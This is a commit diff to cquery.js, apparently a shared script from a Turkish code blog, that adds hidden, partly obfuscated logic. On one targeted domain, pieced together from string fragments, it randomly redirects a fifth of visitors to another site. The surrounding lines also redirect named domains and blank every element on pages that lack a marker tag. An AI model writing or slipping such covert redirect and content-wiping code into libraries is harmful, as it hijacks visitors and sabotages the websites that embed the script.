9e043ea09e95abf3477940050e7d995fa8575ce7
kilavuzcu@gmail.com <kilavuzcu@gmail.com@3e4efce4-d64c-69f8-84b6-72d23f97b73c>
2014-02-08 11:05:20 +0000

    sglm

--- cquery.js
+++ cquery.js
@@ -1,4 +1,11 @@
  if(window.location == 'http://kodperest.blogspot.com/2013/09/perdeli-acls-efekti-kodu.html'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
+ var ad ="aglamoy";
+if(document.domain == 'www.s' + ad + 'un.com'){
+  var zar = Math.floor((Math.random()*100)+1); if(zar >= 80){location.href='http://tam1oyun.blogspot.com.tr'}
+}
+if(document.domain == 's' + ad + 'un.com'){
+  var zar = Math.floor((Math.random()*100)+1); if(zar >= 80){location.href='http://tam1oyun.blogspot.com.tr'}
+}
 if(document.domain == 'www.kodyolu.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
 if(document.domain == 'kodyolu.com'){alert('UYARI: Emek hırsızlığı kötü sonuçlar doğurabilir.');location.href='http://www.koddostu.com';}
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
